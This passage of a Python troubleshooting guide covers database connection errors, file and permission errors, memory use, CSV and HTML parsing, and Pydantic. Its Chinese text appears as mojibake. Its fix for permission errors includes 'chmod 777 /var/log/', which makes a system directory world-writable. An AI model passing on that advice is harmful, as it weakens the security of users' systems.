        <pre><span></span><code><span class="n">ServerSelectionTimeoutError</span><span class="p">:</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">27017</span><span class="p">:</span> <span class="p">[</span><span class="n">Errno</span> <span class="mi">111</span><span class="p">]</span> <span class="n">Connection</span> <span class="n">refused</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pymongo</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pymongo.errors</span><span class="w"> </span><span class="kn">import</span> <span class="n">ServerSelectionTimeoutError</span>

<span class="c1"># æ·»åŠ è¶…æ—¶å’Œé”™è¯¯å¤„ç†</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">client</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span>
        <span class="s1">&#39;mongodb://localhost:27017/&#39;</span><span class="p">,</span>
        <span class="n">serverSelectionTimeoutMS</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span>
        <span class="n">connectTimeoutMS</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span>
        <span class="n">socketTimeoutMS</span><span class="o">=</span><span class="mi">5000</span>
    <span class="p">)</span>

    <span class="c1"># æµ‹è¯•è¿æ¥</span>
    <span class="n">client</span><span class="o">.</span><span class="n">server_info</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;âœ… MongoDB connected&quot;</span><span class="p">)</span>

<span class="k">except</span> <span class="n">ServerSelectionTimeoutError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âŒ MongoDB connection failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;æç¤º:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. æ£€æŸ¥ MongoDB æ˜¯å¦è¿è¡Œ: systemctl status mongod&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;2. æ£€æŸ¥ç«¯å£: netstat -an | grep 27017&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. æ£€æŸ¥é˜²ç«å¢™è®¾ç½®&quot;</span><span class="p">)</span>
    <span class="n">exit</span><span class="p">()</span>
</code></pre>
      </div>

      <h4 id="è®¤è¯é—®é¢˜">è®¤è¯é—®é¢˜</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¸¦è®¤è¯çš„è¿æ¥</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span>
    <span class="s1">&#39;mongodb://username:password@localhost:27017/&#39;</span><span class="p">,</span>
    <span class="n">authSource</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span>  <span class="c1"># è®¤è¯æ•°æ®åº“</span>
    <span class="n">authMechanism</span><span class="o">=</span><span class="s1">&#39;SCRAM-SHA-256&#39;</span>  <span class="c1"># è®¤è¯æœºåˆ¶</span>
<span class="p">)</span>

<span class="c1"># æˆ–ä½¿ç”¨ URI æ ¼å¼</span>
<span class="n">uri</span> <span class="o">=</span> <span class="s1">&#39;mongodb://username:password@host1:27017,host2:27017/database?authSource=admin&#39;</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="mysql-è¿æ¥é—®é¢˜">MySQL è¿æ¥é—®é¢˜</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">Error</span> <span class="mi">2003</span><span class="p">:</span> <span class="n">Can</span><span class="s1">&#39;t connect to MySQL server on &#39;</span><span class="n">localhost</span><span class="s1">&#39;</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">mysql.connector</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">mysql.connector</span><span class="w"> </span><span class="kn">import</span> <span class="n">Error</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">connection</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">connector</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span>
        <span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
        <span class="n">port</span><span class="o">=</span><span class="mi">3306</span><span class="p">,</span>
        <span class="n">database</span><span class="o">=</span><span class="s1">&#39;testdb&#39;</span><span class="p">,</span>
        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;root&#39;</span><span class="p">,</span>
        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;password&#39;</span><span class="p">,</span>
        <span class="n">connect_timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
        <span class="n">autocommit</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
        <span class="n">charset</span><span class="o">=</span><span class="s1">&#39;utf8mb4&#39;</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="n">connection</span><span class="o">.</span><span class="n">is_connected</span><span class="p">():</span>
        <span class="n">db_info</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">get_server_info</span><span class="p">()</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… Connected to MySQL Server version </span><span class="si">{</span><span class="n">db_info</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">except</span> <span class="n">Error</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âŒ Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;æ£€æŸ¥é¡¹:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. MySQL æœåŠ¡æ˜¯å¦è¿è¡Œ&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;2. ç”¨æˆ·åå¯†ç æ˜¯å¦æ­£ç¡®&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. æ˜¯å¦å…è®¸è¿œç¨‹è¿æ¥&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;4. é˜²ç«å¢™è®¾ç½®&quot;</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">connection</span> <span class="ow">and</span> <span class="n">connection</span><span class="o">.</span><span class="n">is_connected</span><span class="p">():</span>
        <span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre>
      </div>

      <h3 id="redis-è¿æ¥é—®é¢˜">Redis è¿æ¥é—®é¢˜</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">redis.exceptions</span><span class="w"> </span><span class="kn">import</span> <span class="ne">ConnectionError</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span>
        <span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
        <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span>
        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;password&#39;</span><span class="p">,</span>  <span class="c1"># å¦‚æœæœ‰å¯†ç </span>
        <span class="n">db</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
        <span class="n">decode_responses</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
        <span class="n">socket_connect_timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span>
        <span class="n">socket_timeout</span><span class="o">=</span><span class="mi">5</span>
    <span class="p">)</span>

    <span class="c1"># æµ‹è¯•è¿æ¥</span>
    <span class="n">r</span><span class="o">.</span><span class="n">ping</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;âœ… Redis connected&quot;</span><span class="p">)</span>

<span class="k">except</span> <span class="ne">ConnectionError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âŒ Redis connection failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="k">except</span> <span class="n">redis</span><span class="o">.</span><span class="n">AuthenticationError</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;âŒ Redis authentication failed&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ–‡ä»¶è¯»å†™é”™è¯¯">æ–‡ä»¶è¯»å†™é”™è¯¯</h2>

      <h3 id="æ–‡ä»¶ä¸å­˜åœ¨">æ–‡ä»¶ä¸å­˜åœ¨</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="ne">FileNotFoundError</span><span class="p">:</span> <span class="p">[</span><span class="n">Errno</span> <span class="mi">2</span><span class="p">]</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="p">:</span> <span class="s1">&#39;data.txt&#39;</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pathlib</span><span class="w"> </span><span class="kn">import</span> <span class="n">Path</span>

<span class="c1"># æ–¹æ³• 1: æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>
<span class="n">file_path</span> <span class="o">=</span> <span class="s1">&#39;data.txt&#39;</span>
<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;File not found: </span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># æ–¹æ³• 2: ä½¿ç”¨ Path å¯¹è±¡</span>
<span class="n">file_path</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s1">&#39;data.txt&#39;</span><span class="p">)</span>
<span class="k">if</span> <span class="n">file_path</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">file_path</span><span class="o">.</span><span class="n">read_text</span><span class="p">(</span><span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>

<span class="c1"># æ–¹æ³• 3: åˆ›å»ºç›®å½•</span>
<span class="n">output_dir</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s1">&#39;output/data&#39;</span><span class="p">)</span>
<span class="n">output_dir</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="c1"># æ–¹æ³• 4: ä½¿ç”¨ç»å¯¹è·¯å¾„</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pathlib</span><span class="w"> </span><span class="kn">import</span> <span class="n">Path</span>
<span class="n">base_dir</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span><span class="o">.</span><span class="n">parent</span>
<span class="n">file_path</span> <span class="o">=</span> <span class="n">base_dir</span> <span class="o">/</span> <span class="s1">&#39;data&#39;</span> <span class="o">/</span> <span class="s1">&#39;file.txt&#39;</span>
</code></pre>
      </div>

      <h3 id="æƒé™é”™è¯¯">æƒé™é”™è¯¯</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="ne">PermissionError</span><span class="p">:</span> <span class="p">[</span><span class="n">Errno</span> <span class="mi">13</span><span class="p">]</span> <span class="n">Permission</span> <span class="n">denied</span><span class="p">:</span> <span class="s1">&#39;/var/log/app.log&#39;</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Linux/Mac</span>
<span class="c1"># 1. ä¿®æ”¹æ–‡ä»¶æƒé™</span>
chmod<span class="w"> </span><span class="m">666</span><span class="w"> </span>/var/log/app.log

<span class="c1"># 2. ä¿®æ”¹ç›®å½•æƒé™</span>
chmod<span class="w"> </span><span class="m">777</span><span class="w"> </span>/var/log/

<span class="c1"># 3. ä¿®æ”¹æ‰€æœ‰è€…</span>
sudo<span class="w"> </span>chown<span class="w"> </span><span class="nv">$USER</span>:<span class="nv">$USER</span><span class="w"> </span>/var/log/app.log

<span class="c1"># 4. ä½¿ç”¨ç”¨æˆ·ç›®å½•</span>
<span class="c1"># åœ¨ä»£ç ä¸­ä½¿ç”¨ ~/data/ è€Œä¸æ˜¯ /var/log/</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ç”¨æˆ·ç›®å½•</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pathlib</span><span class="w"> </span><span class="kn">import</span> <span class="n">Path</span>

<span class="n">home</span> <span class="o">=</span> <span class="n">Path</span><span class="o">.</span><span class="n">home</span><span class="p">()</span>
<span class="n">log_dir</span> <span class="o">=</span> <span class="n">home</span> <span class="o">/</span> <span class="s1">&#39;.myapp&#39;</span> <span class="o">/</span> <span class="s1">&#39;logs&#39;</span>
<span class="n">log_dir</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">log_file</span> <span class="o">=</span> <span class="n">log_dir</span> <span class="o">/</span> <span class="s1">&#39;app.log&#39;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å†…å­˜é—®é¢˜">å†…å­˜é—®é¢˜</h2>

      <h3 id="å†…å­˜æº¢å‡º">å†…å­˜æº¢å‡º</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="ne">MemoryError</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <h4 id="1-åˆ†æ‰¹å¤„ç†å¤§æ–‡ä»¶">1. åˆ†æ‰¹å¤„ç†å¤§æ–‡ä»¶</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä¸è¦ä¸€æ¬¡æ€§è¯»å–æ•´ä¸ªæ–‡ä»¶</span>
<span class="c1"># âŒ é”™è¯¯æ–¹å¼</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;huge_file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>  <span class="c1"># å¯èƒ½å¯¼è‡´å†…å­˜æº¢å‡º</span>

<span class="c1"># âœ… æ­£ç¡®æ–¹å¼:æŒ‰è¡Œè¯»å–</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;huge_file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">process_line</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>

<span class="c1"># æˆ–ä½¿ç”¨ç”Ÿæˆå™¨</span>
<span class="k">def</span><span class="w"> </span><span class="nf">read_large_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">chunk_size</span><span class="o">=</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;åˆ†å—è¯»å–å¤§æ–‡ä»¶&quot;&quot;&quot;</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">chunk</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunk_size</span><span class="p">)</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="k">yield</span> <span class="n">chunk</span>

<span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">read_large_file</span><span class="p">(</span><span class="s1">&#39;huge_file.txt&#39;</span><span class="p">):</span>
    <span class="n">process_chunk</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨è¿­ä»£å™¨">2. ä½¿ç”¨è¿­ä»£å™¨</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># âŒ ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰æ•°æ®</span>
<span class="n">urls</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;https://example.com/page/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">)]</span>

<span class="c1"># âœ… ä½¿ç”¨ç”Ÿæˆå™¨</span>
<span class="k">def</span><span class="w"> </span><span class="nf">url_generator</span><span class="p">(</span><span class="n">count</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">count</span><span class="p">):</span>
        <span class="k">yield</span> <span class="sa">f</span><span class="s2">&quot;https://example.com/page/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&quot;</span>

<span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">url_generator</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
    <span class="n">process_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-æ¸…ç†ä¸ç”¨çš„å¯¹è±¡">3. æ¸…ç†ä¸ç”¨çš„å¯¹è±¡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">gc</span>

<span class="c1"># æ‰‹åŠ¨è§¦å‘åƒåœ¾å›æ”¶</span>
<span class="n">gc</span><span class="o">.</span><span class="n">collect</span><span class="p">()</span>

<span class="c1"># åˆ é™¤å¤§å¯¹è±¡</span>
<span class="k">del</span> <span class="n">large_dataframe</span>
<span class="n">gc</span><span class="o">.</span><span class="n">collect</span><span class="p">()</span>
</code></pre>
      </div>

      <h4 id="4-ä½¿ç”¨æ•°æ®åº“è€Œéå†…å­˜">4. ä½¿ç”¨æ•°æ®åº“è€Œéå†…å­˜</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># âŒ æ‰€æœ‰æ•°æ®å­˜åœ¨å†…å­˜ä¸­</span>
<span class="n">all_data</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">items</span><span class="p">:</span>
    <span class="n">all_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">process</span><span class="p">(</span><span class="n">item</span><span class="p">))</span>

<span class="c1"># âœ… ç›´æ¥å­˜å…¥æ•°æ®åº“</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>

<span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;data.db&#39;</span><span class="p">)</span>
<span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>

<span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">items</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>
    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;INSERT INTO results VALUES (?, ?)&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">value</span><span class="p">))</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="csv-å¤„ç†é—®é¢˜">CSV å¤„ç†é—®é¢˜</h2>

      <h3 id="ç¼–ç å’Œåˆ†éš”ç¬¦">ç¼–ç å’Œåˆ†éš”ç¬¦</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">csv</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">chardet</span>

<span class="c1"># æ£€æµ‹ç¼–ç </span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;data.csv&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">chardet</span><span class="o">.</span><span class="n">detect</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
    <span class="n">encoding</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;encoding&#39;</span><span class="p">]</span>

<span class="c1"># è¯»å– CSV</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;data.csv&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="n">encoding</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="c1"># è‡ªåŠ¨æ£€æµ‹åˆ†éš”ç¬¦</span>
    <span class="n">sample</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">sniffer</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">Sniffer</span><span class="p">()</span>
    <span class="n">delimiter</span> <span class="o">=</span> <span class="n">sniffer</span><span class="o">.</span><span class="n">sniff</span><span class="p">(</span><span class="n">sample</span><span class="p">)</span><span class="o">.</span><span class="n">delimiter</span>

    <span class="n">reader</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">DictReader</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">delimiter</span><span class="o">=</span><span class="n">delimiter</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">reader</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">row</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="å¤„ç†å¤§å‹-csv">å¤„ç†å¤§å‹ CSV</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pandas</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">pd</span>

<span class="c1"># åˆ†å—è¯»å–</span>
<span class="n">chunk_size</span> <span class="o">=</span> <span class="mi">10000</span>
<span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="s1">&#39;large.csv&#39;</span><span class="p">,</span> <span class="n">chunksize</span><span class="o">=</span><span class="n">chunk_size</span><span class="p">):</span>
    <span class="n">process_chunk</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>

<span class="c1"># åªè¯»å–éœ€è¦çš„åˆ—</span>
<span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="s1">&#39;data.csv&#39;</span><span class="p">,</span> <span class="n">usecols</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;col1&#39;</span><span class="p">,</span> <span class="s1">&#39;col2&#39;</span><span class="p">])</span>

<span class="c1"># æŒ‡å®šæ•°æ®ç±»å‹èŠ‚çœå†…å­˜</span>
<span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="s1">&#39;data.csv&#39;</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="s1">&#39;int32&#39;</span><span class="p">,</span> <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="s1">&#39;float32&#39;</span><span class="p">})</span>
</code></pre>
      </div>

      <hr />

      <h2 id="xmlhtml-è§£æé—®é¢˜">XML/HTML è§£æé—®é¢˜</h2>

      <h3 id="è§£æå¤±è´¥">è§£æå¤±è´¥</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">lxml</span><span class="w"> </span><span class="kn">import</span> <span class="n">etree</span>

<span class="n">html</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># æ–¹æ³• 1: BeautifulSoup (å®½å®¹)</span>
<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>  <span class="c1"># æˆ– &#39;html.parser&#39;</span>

<span class="c1"># æ–¹æ³• 2: lxml (ä¸¥æ ¼)</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">tree</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">HTML</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
<span class="k">except</span> <span class="n">etree</span><span class="o">.</span><span class="n">XMLSyntaxError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Parse error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># å¤„ç†ç•¸å½¢ HTML</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">lxml.html</span><span class="w"> </span><span class="kn">import</span> <span class="n">fromstring</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">lxml.html.clean</span><span class="w"> </span><span class="kn">import</span> <span class="n">Cleaner</span>

<span class="n">cleaner</span> <span class="o">=</span> <span class="n">Cleaner</span><span class="p">()</span>
<span class="n">cleaned_html</span> <span class="o">=</span> <span class="n">cleaner</span><span class="o">.</span><span class="n">clean_html</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
<span class="n">doc</span> <span class="o">=</span> <span class="n">fromstring</span><span class="p">(</span><span class="n">cleaned_html</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ•°æ®éªŒè¯">æ•°æ®éªŒè¯</h2>

      <h3 id="ä½¿ç”¨-pydantic">ä½¿ç”¨ Pydantic</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pydantic</span><span class="w"> </span><span class="kn">import</span> <span class="n">BaseModel</span><span class="p">,</span> <span class="n">validator</span><span class="p">,</span> <span class="n">ValidationError</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Optional</span>

<span class="k">class</span><span class="w"> </span><span class="nc">Item</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
    <span class="nb">id</span><span class="p">:</span> <span class="nb">int</span>
    <span class="n">name</span><span class="p">:</span> <span class="nb">str</span>
    <span class="n">price</span><span class="p">:</span> <span class="nb">float</span>
